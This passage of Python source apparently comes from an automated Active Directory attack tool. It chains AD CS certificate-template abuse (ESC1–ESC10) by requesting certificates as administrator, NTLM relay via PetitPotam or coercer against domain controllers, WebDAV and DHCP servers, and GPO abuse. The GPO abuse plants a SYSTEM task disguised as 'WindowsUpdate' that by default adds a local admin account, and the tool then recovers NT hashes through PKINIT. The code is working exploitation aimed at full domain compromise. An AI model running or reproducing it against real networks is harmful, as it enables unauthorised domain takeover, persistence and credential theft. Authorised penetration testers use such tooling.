    # certipy appends ".pfx" automatically, so pass the stem without extension
    pfx_stem = cfg.work_dir / f"adcs-{esc_type}-{template}"
    pfx_path = Path(str(pfx_stem) + ".pfx")

    auth_args = ["-u", f"{cfg.username}@{cfg.domain}", "-dc-ip", cfg.dc_ip]
    if cfg.nthash:
        auth_args += ["-hashes", f":{cfg.nthash}"]
    else:
        auth_args += ["-p", cfg.password]

    if esc_type in ("ESC1", "ESC2", "ESC3", "ESC6"):
        # Direct template abuse — request cert with admin UPN
        log.info(f"  Exploiting {esc_type} via template '{template}'...")
        cmd = (
            ["certipy", "req"] + auth_args +
            ["-ca", ca_name, "-template", template,
             "-upn", f"administrator@{cfg.domain}",
             "-out", str(pfx_stem)]
        )
        result = run(cmd, cfg, timeout=120)
        if result.returncode == 0 and pfx_path.exists():
            ok(f"  {esc_type}: Certificate obtained via template '{template}'")
            return str(pfx_path)

    elif esc_type == "ESC4":
        # Modify template → exploit as ESC1 → ALWAYS restore (try/finally)
        log.info(f"  Exploiting ESC4: modifying template '{template}' to enable ESC1...")
        save_cmd = (
            ["certipy", "template"] + auth_args +
            ["-template", template, "-save-old"]
        )
        result = run(save_cmd, cfg, timeout=60)
        if result.returncode != 0:
            log.warning(f"  ESC4: Failed to modify template '{template}'")
            return None

        pfx = None
        try:
            # Now exploit as ESC1
            pfx = _adcs_exploit_template(template, ca_name, "ESC1", cfg)
        finally:
            # ALWAYS restore original template, even on exception
            log.info(f"  ESC4: Restoring original template configuration...")
            old_config = cfg.work_dir / f"{template}.json"
            if old_config.exists():
                restore_cmd = (
                    ["certipy", "template"] + auth_args +
                    ["-template", template, "-configuration", str(old_config)]
                )
                run(restore_cmd, cfg, timeout=60)
                ok(f"  ESC4: Template '{template}' restored")
            else:
                log.error(f"  ESC4: Cannot restore — {old_config} not found! Template may be modified!")

        return pfx

    elif esc_type in ("ESC9", "ESC10"):
        # ESC9: template has CT_FLAG_NO_SECURITY_EXTENSION (no SID ext in cert)
        # ESC10: DC has weak cert mapping (StrongCertificateBindingEnforcement=0
        #        or CertificateMappingMethods has 0x4/UPN flag)
        # Both bypass CVE-2022-26923 by relying on UPN-based KDC mapping:
        #   1. Swap a victim user's UPN to "Administrator"
        #   2. Enroll cert as victim → cert SAN = "Administrator"
        #   3. Restore UPN
        #   4. PKINIT — KDC has no SID to bind against, falls back to UPN match
        return _adcs_esc9_esc10_attack(template, ca_name, esc_type, cfg, pfx_stem, pfx_path)

    elif esc_type == "ESC7":
        # CA officer abuse — enable SubCA template, request, approve
        log.info(f"  Exploiting ESC7: enabling SubCA template on CA '{ca_name}'...")
        enable_cmd = (
            ["certipy", "ca"] + auth_args +
            ["-ca", ca_name, "-enable-template", "SubCA"]
        )
        result = run(enable_cmd, cfg, timeout=60)
        if result.returncode != 0:
            log.warning("  ESC7: Failed to enable SubCA template")
            return None

        # Request SubCA cert
        req_cmd = (
            ["certipy", "req"] + auth_args +
            ["-ca", ca_name, "-template", "SubCA",
             "-upn", f"administrator@{cfg.domain}",
             "-out", str(pfx_stem)]
        )
        result = run(req_cmd, cfg, timeout=120)
        # ESC7 may require approval — check for request ID
        req_id_match = re.search(r"Request ID(?:\s*is)?\s*:?\s*(\d+)", result.stdout or "")
        if req_id_match:
            req_id = req_id_match.group(1)
            log.info(f"  ESC7: Approving request ID {req_id}...")
            approve_cmd = (
                ["certipy", "ca"] + auth_args +
                ["-ca", ca_name, "-issue-request", req_id]
            )
            run(approve_cmd, cfg, timeout=60)
            # Retrieve the cert
            retrieve_cmd = (
                ["certipy", "req"] + auth_args +
                ["-ca", ca_name, "-retrieve", req_id,
                 "-out", str(pfx_stem)]
            )
            result = run(retrieve_cmd, cfg, timeout=60)

        if pfx_path.exists():
            ok(f"  ESC7: Certificate obtained via SubCA")
            return str(pfx_path)

    else:
        # Generic attempt for ESC13, ESC15, etc.
        log.info(f"  Attempting generic {esc_type} exploit on template '{template}'...")
        cmd = (
            ["certipy", "req"] + auth_args +
            ["-ca", ca_name, "-template", template,
             "-upn", f"administrator@{cfg.domain}",
             "-out", str(pfx_stem)]
        )
        result = run(cmd, cfg, timeout=120)
        if result.returncode == 0 and pfx_path.exists():
            ok(f"  {esc_type}: Certificate obtained via template '{template}'")
            return str(pfx_path)

    log.warning(f"  {esc_type} exploitation failed for template '{template}'")
    return None


def _adcs_relay_esc8(ca_host: str, cfg: Config) -> Optional[str]:
    """Exploit ESC8 (HTTP web enrollment) via NTLM relay to CA web service."""
    phase_header("AD CS ESC8 — HTTP Enrollment Relay")

    pfx_path = cfg.work_dir / "adcs-esc8.pfx"
    relay_output = cfg.work_dir / "adcs-esc8-relay.txt"
    bg_procs = []

    try:
        # Start ntlmrelayx targeting the CA web enrollment
        log.info(f"Starting ntlmrelayx targeting http://{ca_host}/certsrv/certfnsh.asp...")
        relay_cmd = [
            "impacket-ntlmrelayx",
            "-t", f"http://{ca_host}/certsrv/certfnsh.asp",
            "--adcs", "--template", "Machine",
            "-smb2support",
        ]
        relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_output)
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx for ESC8")
            return None
        bg_procs.append(relay_proc)
        time.sleep(3)
        if relay_proc.poll() is not None:
            log.error("ntlmrelayx exited immediately for ESC8 relay")
            return None

        ok(f"ESC8 relay listener active on {ca_host}")

        # Trigger coercion against DC to relay to CA
        if cfg.dc_ip and cfg.has_creds:
            log.info("Triggering DC authentication coercion for ESC8 relay...")
            try_dc_coercion(cfg.attacker_ip, cfg)

        # Wait for relay to capture certificate
        max_wait = 60
        waited = 0
        while waited < max_wait:
            if relay_output.exists():
                content = relay_output.read_text()
                # Look for base64 certificate in output
                cert_match = re.search(
                    r"Certificate.*?base64|Got certificate|-----BEGIN CERTIFICATE",
                    content, re.IGNORECASE
                )
                if cert_match:
                    ok("ESC8: Certificate captured via relay!")
                    # Extract and save PFX
                    pfx_match = re.search(r"Saved PFX.*?to\s+(\S+\.pfx)", content)
                    if pfx_match:
                        captured_pfx = Path(pfx_match.group(1))
                        if captured_pfx.exists():
                            import shutil as _shutil
                            _shutil.copy2(str(captured_pfx), str(pfx_path))
                            return str(pfx_path)
                    return str(pfx_path) if pfx_path.exists() else None
            time.sleep(3)
            waited += 3

        log.warning("ESC8 relay: No certificate captured within timeout")
        return None

    finally:
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)


def _adcs_auth_pfx(pfx_path: str, cfg: Config) -> bool:
    """Authenticate with a PFX certificate to obtain NT hash via PKINIT.

    Tries to authenticate as administrator (the cert SAN); on patched DCs
    (CVE-2022-26923 SID binding) this falls back to whoever the requestor
    was. The actual recovered identity is parsed from certipy's output.
    """
    if not tool_exists("certipy"):
        log.warning("certipy not found — cannot authenticate with PFX")
        return False

    log.info(f"Authenticating with certificate: {pfx_path}")
    auth_output = cfg.work_dir / "adcs-auth.txt"

    # Force username=administrator so PAC lookup targets DA on unpatched DCs
    result = run(
        ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", cfg.dc_ip,
         "-username", "administrator", "-domain", cfg.domain],
        cfg, timeout=120, outfile=auth_output
    )

    output = result.stdout or ""
    if auth_output.exists():
        output += auth_output.read_text()

    # Preferred: parse "Got hash for 'USER@DOMAIN': LM:NT" — gives us the real identity
    m = re.search(
        r"Got hash for '([^@']+)@[^']*'\s*:\s*[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
        output
    )
    if m:
        recovered_user, nt_hash = m.group(1), m.group(2)
        cfg.username = recovered_user
        cfg.nthash = nt_hash
        cfg.password = ""
        is_admin = recovered_user.lower() in ("administrator", "admin")
        if is_admin:
            success_box("AD CS: Domain Admin NT hash recovered!")
        else:
            ok(f"AD CS: NT hash recovered for {recovered_user} (CVE-2022-26923 SID binding "
               f"prevented impersonation as administrator)")
        detail(f"User: {recovered_user}  NT: {nt_hash}")
        return is_admin  # only signal success if we actually got DA

    # Fallback: legacy regex without username context
    hash_match = re.search(r"(?:NT[: ]+hash)[:\s]+([a-fA-F0-9]{32})", output, re.IGNORECASE)
    if hash_match:
        cfg.nthash = hash_match.group(1)
        log.warning(f"Recovered NT hash {cfg.nthash} but could not determine identity — "
                    f"assuming current user")
        return False

    log.warning("Failed to recover NT hash from certificate authentication")
    return False


def run_adcs_attack(cfg: Config) -> bool:
    """Exploit AD CS vulnerable certificate templates for domain escalation."""
    phase_header("AD CS EXPLOITATION (ESC1-ESC17 detect / ESC1-ESC16 exploit)")

    if not tool_exists("certipy"):
        log.error("certipy not found — install with: apt install certipy-ad")
        return False

    if not cfg.has_creds:
        log.error("AD CS exploitation requires domain credentials (-u/-p)")
        return False

    # Priority order for exploitation (ESC5/ESC17 are detection-only — no exploiter)
    esc_priority = ["ESC1", "ESC8", "ESC4", "ESC6", "ESC7", "ESC13", "ESC15",
                    "ESC2", "ESC3", "ESC9", "ESC10", "ESC11", "ESC14", "ESC16",
                    "ESC5", "ESC17"]
    detect_only = {"ESC5", "ESC12", "ESC17"}

    # 1a. Try Certihound first (broader coverage + BloodHound CE export)
    ch_result = _certihound_find(cfg)
    if ch_result:
        vulnerabilities = ch_result["vulns"]
        ca_name = cfg.ca_name or ch_result["ca_name"]
        ca_host = ch_result["ca_host"]
    else:
        # 1b. Fallback to certipy find
        log.info("Enumerating AD CS certificate templates with certipy...")
        enum_output = cfg.work_dir / "adcs-enum.txt"

        auth_args = ["-u", f"{cfg.username}@{cfg.domain}", "-dc-ip", cfg.dc_ip]
        if cfg.nthash:
            auth_args += ["-hashes", f":{cfg.nthash}"]
        else:
            auth_args += ["-p", cfg.password]

        result = run(
            ["certipy", "find"] + auth_args +
            ["-vulnerable", "-stdout", "-json", "-output", str(cfg.work_dir / "adcs-enum")],
            cfg, timeout=180, outfile=enum_output
        )

        output = result.stdout or ""
        if enum_output.exists():
            output = enum_output.read_text()

        if result.returncode != 0 and not output:
            log.error("certipy enumeration failed — check credentials and connectivity")
            return False

        vulnerabilities = []

        # Extract CA name
        ca_match = re.search(r"CA Name\s*:\s*(.+)", output)
        ca_name = cfg.ca_name or (ca_match.group(1).strip() if ca_match else "")

        # Extract CA host for ESC8 — look for DNS Name or CA server hostname
        ca_host = ""
        for pattern in [
            r"DNS Name\s*:\s*(\S+)",
            r"CA DNS\s*:\s*(\S+)",
            r"dNSHostName\s*:\s*(\S+)",
            r"Certificate Authority\s*:.*?DNS Name\s*:\s*(\S+)",
        ]:
            m = re.search(pattern, output, re.IGNORECASE | re.DOTALL)
            if m and m.group(1).lower() not in ("enabled", "disabled", "true", "false"):
                ca_host = m.group(1).strip()
                break
        if not ca_host and cfg.dc_ip:
            ca_host = cfg.dc_ip

        # Find all ESC vulnerabilities with their templates
        template_sections = re.split(r"(?=Template Name\s*:)", output)
        for section in template_sections:
            tmpl_match = re.search(r"Template Name\s*:\s*(\S+)", section)
            if not tmpl_match:
                continue
            template = tmpl_match.group(1)
            for esc in esc_priority:
                if re.search(rf"\b{esc}\b", section):
                    vulnerabilities.append((esc, template))

        # Check for ESC8 (HTTP enrollment) separately
        if re.search(r"Web Enrollment|HTTP.*Enrollment|ESC8", output, re.IGNORECASE):
            if ("ESC8", "WebEnrollment") not in vulnerabilities:
                vulnerabilities.append(("ESC8", "WebEnrollment"))

    if not vulnerabilities:
        log.warning("No vulnerable AD CS templates found")
        return False

    ok(f"Found {len(vulnerabilities)} AD CS vulnerability/ies:")
    for esc, tmpl in vulnerabilities:
        detail(f"  {esc}: {tmpl}")

    if ca_name:
        detail(f"  CA: {ca_name}")

    # 3. Attempt exploitation in priority order
    # Sort by priority
    vuln_sorted = sorted(vulnerabilities,
                         key=lambda v: esc_priority.index(v[0])
                         if v[0] in esc_priority else 99)

    for esc_type, template in vuln_sorted:
        separator()

        if esc_type in detect_only:
            log.warning(f"  {esc_type} detected on '{template}' — no automated exploiter (manual required)")
            continue

        # ESC8 uses relay, not direct exploitation
        if esc_type == "ESC8" and ca_host:
            pfx = _adcs_relay_esc8(ca_host, cfg)
        elif ca_name:
            pfx = _adcs_exploit_template(template, ca_name, esc_type, cfg)
        else:
            log.warning(f"Cannot exploit {esc_type} — CA name not determined")
            continue

        if pfx:
            # 5. Authenticate with PFX to get NT hash
            if _adcs_auth_pfx(pfx, cfg):
                success_box(f"AD CS {esc_type} → Domain Admin via certificate!")
                return True
            else:
                log.warning(f"Got PFX via {esc_type} but PKINIT auth failed — trying next")
                detail(f"PFX saved: {pfx}")
                detail("Manual auth: certipy auth -pfx <file> -dc-ip <dc>")

    log.warning("All AD CS exploitation attempts failed")
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# WebDAV Coercion (WebClient Service Abuse)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_webclient_hosts(cfg: Config) -> list[str]:
    """Scan for hosts with WebClient service running (DAV RPC pipe).

    WebClient enables HTTP-based NTLM auth that bypasses SMB signing,
    allowing relay to LDAP for Shadow Credentials or RBCD.
    """
    log.info("🌐 Scanning for hosts with WebClient service running...")

    # webclientservicescanner checks \\pipe\\DAV RPC SERVICE via RPC
    scanner = find_tool(
        "webclientservicescanner",
        paths=[TOOLS_DIR / "WebclientServiceScanner" / "webclientservicescanner.py"]
    )

    webclient_hosts = []

    if scanner and cfg.has_creds:
        output_file = cfg.work_dir / "webclient-scan.txt"
        auth = f"{cfg.domain}/{cfg.username}:{cfg.password}" if cfg.password else \
               f"{cfg.domain}/{cfg.username}"
        target = cfg.target_net or cfg.dc_ip

        result = run(
            scanner.split() + [f"{auth}@{target}"],
            cfg, timeout=120, outfile=output_file
        )

        if output_file.exists():
            content = output_file.read_text()
            # Parse hosts where WebClient is running
            for line in content.splitlines():
                if "running" in line.lower() or "enabled" in line.lower():
                    ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                    if ip_match:
                        webclient_hosts.append(ip_match.group(1))

    if not webclient_hosts and cfg.has_creds:
        # Fallback: use nxc to check named pipe
        log.info("Checking WebClient via SMB named pipe scan...")
        result = run(
            ["nxc", "smb", cfg.target_net or cfg.dc_ip] +
            _nxc_auth_args(cfg) + ["-M", "webdav"],
            cfg, timeout=120, outfile=cfg.work_dir / "webclient-nxc.txt"
        )
        if result.stdout:
            for line in result.stdout.splitlines():
                if "webdav" in line.lower() and ("enabled" in line.lower() or "running" in line.lower()):
                    ip_match = re.search(r"(\d+\.\d+\.\d+\.\d+)", line)
                    if ip_match:
                        webclient_hosts.append(ip_match.group(1))

    if webclient_hosts:
        ok(f"Found {len(webclient_hosts)} host(s) with WebClient running")
        for h in webclient_hosts:
            detail(h)
    else:
        log.warning("No hosts with WebClient service found")

    return webclient_hosts


def run_webdav_coercion(target: str, cfg: Config) -> bool:
    """Coerce HTTP-based NTLM auth via WebDAV and relay to LDAP.

    WebClient auth is HTTP-based (not SMB), so it bypasses SMB signing.
    This enables relay to LDAP for Shadow Credentials or RBCD even when
    SMB signing is enforced on all hosts.

    Chain: coerce WebDAV auth → ntlmrelayx HTTP→LDAP → Shadow Creds/RBCD
    """
    phase_header("WebDAV COERCION (WebClient HTTP→LDAP Relay)")

    if not cfg.dc_ip:
        log.error("Need --dc-ip for WebDAV relay target")
        return False

    # Check coercion tools before starting relay (avoid wasting resources)
    petitpotam = find_tool(
        "PetitPotam.py",
        paths=[
            Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
            TOOLS_DIR / "PetitPotam" / "PetitPotam.py",
        ]
    )
    if not petitpotam and not tool_exists("coercer"):
        log.error("No coercion tool found for WebDAV trigger (need PetitPotam or coercer)")
        return False

    relay_output = cfg.work_dir / "webdav-relay.txt"
    bg_procs = []

    try:
        # Start ntlmrelayx listening on HTTP (port 80) — relay to LDAP
        relay_cmd = [
            "impacket-ntlmrelayx",
            "-t", f"ldap://{cfg.dc_ip}",
            "-smb2support",
            "--no-smb-server",  # Only listen on HTTP (WebDAV coercion is HTTP)
            "-of", str(cfg.work_dir / "webdav-hashes"),
        ]

        if not cfg.no_shadow_creds:
            relay_cmd += ["--shadow-credentials", "--shadow-target", f"{target.split('.')[0]}$"]
        elif not cfg.no_rbcd:
            relay_cmd += ["--delegate-access"]

        log.info("🎣 Starting ntlmrelayx HTTP→LDAP relay for WebDAV coercion...")
        relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_output)
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx for WebDAV relay")
            return False
        bg_procs.append(relay_proc)
        time.sleep(3)
        if relay_proc.poll() is not None:
            log.error(f"ntlmrelayx exited immediately (code {relay_proc.returncode})")
            return False

        # Trigger WebDAV coercion using PetitPotam over HTTP
        # PetitPotam with @80/path forces HTTP instead of SMB
        log.info(f"🔨 Triggering WebDAV coercion on {target}...")
        coerce_target = f"{target}@80/test"  # Force HTTP via WebDAV

        petitpotam = find_tool(
            "PetitPotam.py",
            paths=[
                Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
                TOOLS_DIR / "PetitPotam" / "PetitPotam.py",
            ]
        )

        if petitpotam:
            coerce_cmd = petitpotam.split() + [
                cfg.attacker_ip, coerce_target
            ]
            if cfg.has_creds:
                coerce_cmd = petitpotam.split() + [
                    "-u", cfg.username, "-p", cfg.password, "-d", cfg.domain,
                    cfg.attacker_ip, target
                ]
            result = run(coerce_cmd, cfg, timeout=30,
                        outfile=cfg.work_dir / "webdav-coerce.txt")
        else:
            # Fallback: use coercer with HTTP filter
            if tool_exists("coercer"):
                coerce_cmd = [
                    "coercer", "coerce",
                    "-t", target, "-l", cfg.attacker_ip,
                    "--filter-transport", "MS-EFSRPC",
                ]
                if cfg.has_creds:
                    coerce_cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
                result = run(coerce_cmd, cfg, timeout=60,
                            outfile=cfg.work_dir / "webdav-coerce.txt")
            else:
                log.error("No coercion tool found for WebDAV trigger")
                return False

        # Wait for relay capture
        time.sleep(10)

        if relay_output.exists():
            content = relay_output.read_text()
            if re.search(r"authenticated|SUCCEED|shadow|delegate|credential",
                         content, re.IGNORECASE):
                ok("🎣 WebDAV coercion succeeded — HTTP auth relayed to LDAP!")

                # Look for shadow credential PFX
                pfx_files = list(cfg.work_dir.glob("*.pfx"))
                if pfx_files:
                    ok(f"Shadow credential PFX generated: {pfx_files[0]}")
                    _pkinit_auth(pfx_files[0], "", cfg)

                return True

        log.warning("WebDAV coercion did not capture relayable auth")
        return False

    finally:
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DHCP Coercion
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_dhcp_server(cfg: Config) -> str:
    """Discover DHCP servers on the network via nmap or passive sniff results."""
    log.info("🔍 Scanning for DHCP servers...")

    if not tool_exists("nmap"):
        return ""

    target = cfg.target_net or cfg.dc_ip
    if not target:
        return ""

    # DHCP servers typically run on DCs or dedicated servers — scan UDP 67
    result = run(
        ["nmap", "-sU", "-n", "-Pn", "--open", "-p", "67", target],
        cfg, timeout=120
    )
    hosts = re.findall(
        r"Nmap scan report for (\d+\.\d+\.\d+\.\d+).*?67/udp\s+open",
        result.stdout, re.DOTALL
    )
    if hosts:
        ok(f"DHCP server found: {hosts[0]}")
        return hosts[0]

    log.warning("No DHCP server detected")
    return ""


def run_dhcp_coercion(cfg: Config) -> bool:
    """Coerce DHCP server to authenticate via Kerberos/NTLM.

    Uses coercer framework (which includes DHCP coercion methods) or
    direct PetitPotam/DFSCoerce against the DHCP server to trigger its
    machine account to authenticate to the attacker, then relay to LDAP.
    """
    phase_header("DHCP COERCION")

    dhcp_server = detect_dhcp_server(cfg)
    if not dhcp_server:
        log.warning("No DHCP server found — skipping DHCP coercion")
        return False

    if not tool_exists("coercer") and not tool_exists("PetitPotam.py"):
        petitpotam = find_tool("PetitPotam.py", paths=[
            Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
            TOOLS_DIR / "PetitPotam" / "PetitPotam.py",
        ])
        if not petitpotam:
            log.warning("No coercion tool found — skipping DHCP coercion")
            detail("Install: pipx install coercer")
            return False

    relay_output = cfg.work_dir / "dhcp-relay.txt"
    bg_procs = []

    try:
        # Start ntlmrelayx targeting LDAP
        relay_cmd = [
            "impacket-ntlmrelayx",
            "-t", f"ldap://{cfg.dc_ip}",
            "-smb2support",
            "-of", str(cfg.work_dir / "dhcp-hashes"),
        ]
        if not cfg.no_shadow_creds:
            relay_cmd += ["--shadow-credentials"]
        elif not cfg.no_rbcd:
            relay_cmd += ["--delegate-access"]

        log.info("🎣 Starting ntlmrelayx for DHCP coercion relay...")
        relay_proc = run(relay_cmd, cfg, bg=True, outfile=relay_output)
        if not hasattr(relay_proc, 'poll'):
            log.error("Failed to start ntlmrelayx")
            return False
        bg_procs.append(relay_proc)
        time.sleep(3)
        if relay_proc.poll() is not None:
            log.error(f"ntlmrelayx exited immediately")
            return False

        # Trigger coercion against the DHCP server
        log.info(f"🔨 Triggering coercion on DHCP server {dhcp_server}...")
        if tool_exists("coercer"):
            coerce_cmd = [
                "coercer", "coerce",
                "-t", dhcp_server, "-l", cfg.attacker_ip,
            ]
            if cfg.has_creds:
                coerce_cmd += ["-u", cfg.username, "-p", cfg.password, "-d", cfg.domain]
        else:
            # Fallback to PetitPotam
            petitpotam = find_tool("PetitPotam.py", paths=[
                Path("/usr/share/doc/python3-impacket/examples/PetitPotam.py"),
                TOOLS_DIR / "PetitPotam" / "PetitPotam.py",
            ])
            coerce_cmd = petitpotam.split() + [cfg.attacker_ip, dhcp_server]
            if cfg.has_creds:
                coerce_cmd = petitpotam.split() + [
                    "-u", cfg.username, "-p", cfg.password, "-d", cfg.domain,
                    cfg.attacker_ip, dhcp_server
                ]

        result = run(coerce_cmd, cfg, timeout=60,
                    outfile=cfg.work_dir / "dhcp-coerce.txt")

        # Wait for relay
        time.sleep(15)

        if relay_output.exists():
            content = relay_output.read_text()
            if re.search(r"authenticated|SUCCEED|shadow|delegate",
                         content, re.IGNORECASE):
                ok("🎣 DHCP coercion succeeded — machine account NTLM relayed!")
                return True

        log.warning("DHCP coercion did not capture relayable auth")
        return False

    finally:
        for proc in bg_procs:
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        for proc in bg_procs:
            if proc in cfg.bg_processes:
                cfg.bg_processes.remove(proc)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GPO Abuse
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def detect_writable_gpos(cfg: Config) -> list[dict]:
    """Find GPOs the current user can modify.

    Returns list of dicts: [{gpo_id, gpo_name, target_ou}]
    """
    log.info("🔍 Enumerating writable GPOs...")
    gpos = []

    # Method 1: bloodyAD
    if tool_exists("bloodyAD"):
        result = run(
            ["bloodyAD"] + _bloody_auth_args(cfg) + ["get", "writable", "--detail"],
            cfg, timeout=60, outfile=cfg.work_dir / "gpo-enum-bloody.txt"
        )
        if result.stdout:
            # Parse GPO objects with write access
            for match in re.finditer(
                r"(CN=\{([0-9A-Fa-f-]+)\},CN=Policies.*?)(?=CN=|$)",
                result.stdout, re.DOTALL
            ):
                gpo_id = match.group(2)
                gpos.append({"gpo_id": gpo_id, "gpo_name": "", "source": "bloodyAD"})

    # Method 2: nxc GPO module
    if not gpos:
        result = run(
            ["nxc", "ldap", cfg.dc_ip] + _nxc_auth_args(cfg) + ["-M", "gpp_autologin"],
            cfg, timeout=60, outfile=cfg.work_dir / "gpo-enum-nxc.txt"
        )

    # Method 3: LDAP query for GPOs where user has GenericWrite/WriteDacl
    if not gpos:
        log.info("Querying LDAP for GPO permissions...")
        result = run(
            ["nxc", "ldap", cfg.dc_ip] + _nxc_auth_args(cfg) +
             ["--query", "(objectClass=groupPolicyContainer)", "displayName,name"],
            cfg, timeout=60, outfile=cfg.work_dir / "gpo-enum-ldap.txt"
        )
        # GPO ACL checking requires more detailed analysis — log for manual review
        if result.stdout:
            gpo_matches = re.findall(
                r"name:\s*\{([0-9A-Fa-f-]+)\}.*?displayName:\s*(.+)",
                result.stdout, re.IGNORECASE
            )
            for gpo_id, gpo_name in gpo_matches:
                detail(f"GPO: {gpo_name.strip()} ({gpo_id})")

    if gpos:
        ok(f"Found {len(gpos)} potentially writable GPO(s)")
    else:
        log.warning("No writable GPOs detected (may need manual ACL review)")
        log.warning("Check with: bloodyAD get writable --detail")

    return gpos


def run_gpo_abuse(cfg: Config) -> bool:
    """Abuse writable GPO to execute commands on target computers.

    Uses pyGPOAbuse to create an immediate scheduled task that runs as SYSTEM
    on all computers where the GPO applies.
    """
    phase_header("GPO ABUSE")

    if not cfg.has_creds:
        log.error("GPO abuse requires domain credentials")
        return False

    pygpoabuse = find_tool(
        "pygpoabuse.py", "pygpoabuse",
        paths=[
            TOOLS_DIR / "pyGPOAbuse" / "pygpoabuse.py",
        ]
    )

    if not pygpoabuse:
        log.warning("pyGPOAbuse not found — skipping GPO abuse")
        detail("Install: git clone https://github.com/Hackndo/pyGPOAbuse /opt/tools/pyGPOAbuse")
        return False

    # Find writable GPOs
    writable_gpos = detect_writable_gpos(cfg)
    if not writable_gpos:
        log.warning("No writable GPOs found — skipping GPO abuse")
        return False

    gpo = writable_gpos[0]
    gpo_id = gpo["gpo_id"]

    # Build command to execute
    if cfg.custom_cmd:
        exec_cmd = cfg.custom_cmd
    else:
        # Default: add a local admin account
        exec_cmd = "net user hax0r P@ssw0rd123! /add && net localgroup administrators hax0r /add"

    if cfg.applocker:
        exec_cmd = _build_applocker_cmd(cfg, fallback_cmd=exec_cmd)

    log.info(f"⚔️  Abusing GPO {gpo_id} to create immediate scheduled task...")

    # pyGPOAbuse: domain/user:pass -gpo-id "ID" -command "cmd"
    auth = f"{cfg.domain}/{cfg.username}:{cfg.password}" if cfg.password else \
           f"{cfg.domain}/{cfg.username}"

    abuse_cmd = pygpoabuse.split() + [
        auth,
        "-gpo-id", gpo_id,
        "-command", exec_cmd,
        "-taskname", "WindowsUpdate",
        "-description", "System Maintenance Task",
    ]

    if cfg.nthash:
        abuse_cmd += ["-hashes", f"aad3b435b51404eeaad3b435b51404ee:{cfg.nthash}"]

    result = run(abuse_cmd, cfg, timeout=60,
                outfile=cfg.work_dir / "gpo-abuse.txt")

    if result.returncode == 0 and result.stdout:
        if re.search(r"scheduled task|created|success", result.stdout, re.IGNORECASE):
            success_box("GPO abuse — immediate scheduled task created!")
            ok("Task will execute as SYSTEM on next Group Policy refresh (~90 min)")
            detail("Force refresh: gpupdate /force (on target)")
            detail(f"GPO: {gpo_id}")
            detail(f"Command: {exec_cmd}")

            # Save for cleanup
            gpo_file = cfg.work_dir / "gpo-abuse-cleanup.txt"
            gpo_file.write_text(
                f"GPO ID: {gpo_id}\n"
                f"Task: WindowsUpdate\n"
                f"Cleanup: {' '.join(pygpoabuse.split())} {auth} "
                f"-gpo-id {gpo_id} --cleanup\n"
            )
            return True

    log.warning("GPO abuse did not confirm task creation")
    if result.stdout:
        detail(_first_line(result.stdout))
    return False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Shadow Credentials (msDS-KeyCredentialLink)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _pkinit_auth(pfx_path: str, pfx_password: str, cfg: Config) -> bool:
    """Authenticate via PKINIT using a PFX certificate to recover NT hash."""
    if tool_exists("certipy"):
        log.info(f"PKINIT authentication with {pfx_path}...")
        cmd = ["certipy", "auth", "-pfx", pfx_path, "-dc-ip", cfg.dc_ip]
        if pfx_password:
            cmd += ["-pfx-pass", pfx_password]

        result = run(cmd, cfg, timeout=120)
        output = result.stdout or ""

        hash_match = re.search(r"(?:Got hash|NT[: ]+hash)[:\s]+([a-fA-F0-9]{32})",
                               output, re.IGNORECASE)
        if hash_match:
            cfg.nthash = hash_match.group(1)
            ok(f"PKINIT: NT hash recovered: {cfg.nthash}")
            return True

        # Fallback hex match
        hex_match = re.search(r"[:\s]([a-fA-F0-9]{32})(?:\s|$)", output)
        if hex_match and result.returncode == 0:
            cfg.nthash = hex_match.group(1)
            ok(f"PKINIT: Possible NT hash: {cfg.nthash}")
            return True

    # Fallback: PKINITtools gettgtpkinit.py
    pkinit_tool = find_tool(
        "gettgtpkinit.py",
        paths=[TOOLS_DIR / "PKINITtools" / "gettgtpkinit.py"]
    )
    if pkinit_tool:
        log.info("Falling back to PKINITtools for PKINIT auth...")
        ccache_path = cfg.work_dir / "shadow-cred.ccache"
        cmd = pkinit_tool.split() + [
            "-cert-pfx", pfx_path,
            "-dc-ip", cfg.dc_ip,
            f"{cfg.domain}/{cfg.username}",
            str(ccache_path),
        ]
        if pfx_password:
